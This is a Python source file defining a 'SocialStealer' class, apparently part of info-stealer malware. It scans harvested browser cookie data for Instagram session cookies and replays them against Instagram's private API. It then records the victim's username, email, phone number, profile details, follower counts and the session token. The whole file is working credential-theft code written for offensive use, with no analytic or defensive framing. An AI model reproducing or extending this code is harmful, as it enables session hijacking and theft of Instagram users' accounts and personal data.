import os
import re
import json
import requests

class SocialStealer:
    def __init__(self):
        self.instagram = {}

    def steal_instagram(self, cookies_data):
        for key, profiles in cookies_data.items():
            for cookie_line in profiles:
                parts = cookie_line.split('\t')
                if len(parts) >= 7:
                    host = parts[0]
                    name = parts[5]
                    value = parts[6]
                    if 'instagram' in host.lower() and 'sessionid' in name.lower():
                        try:
                            headers = {
                                'User-Agent': 'Instagram 159.0.0.28.123 (iPhone8,1; iOS 14_1; en_SA@calendar=gregorian; ar-SA; scale=2.00; 750x1334) AppleWebKit/420+',
                                'Cookie': f'sessionid={value}',
                            }
                            r = requests.get('https://i.instagram.com/api/v1/accounts/current_user/?edit=true', headers=headers, timeout=10)
                            if r.status_code == 200:
                                user_data = r.json().get('user', {})
                                user_id = user_data.get('pk', '')
                                self.instagram = {
                                    'username': user_data.get('username', 'Unknown'),
                                    'full_name': user_data.get('full_name', 'Unknown'),
                                    'email': user_data.get('email', 'Unknown'),
                                    'phone': user_data.get('phone_number', 'Unknown'),
                                    'bio': user_data.get('biography', ''),
                                    'avatar': user_data.get('profile_pic_url', ''),
                                    'verified': user_data.get('is_verified', False),
                                    'private': user_data.get('is_private', False),
                                    'sessionid': value,
                                }
                                if user_id:
                                    r2 = requests.get(f'https://i.instagram.com/api/v1/users/{user_id}/info', headers=headers, timeout=10)
                                    if r2.status_code == 200:
                                        info_data = r2.json().get('user', {})
                                        self.instagram['followers'] = info_data.get('follower_count', 0)
                                        self.instagram['following'] = info_data.get('following_count', 0)
                                        self.instagram['posts'] = info_data.get('media_count', 0)
                                        return
                        except:
                            pass

    def steal_all(self, cookies_data):
        try:
            self.steal_instagram(cookies_data)
        except:
            pass
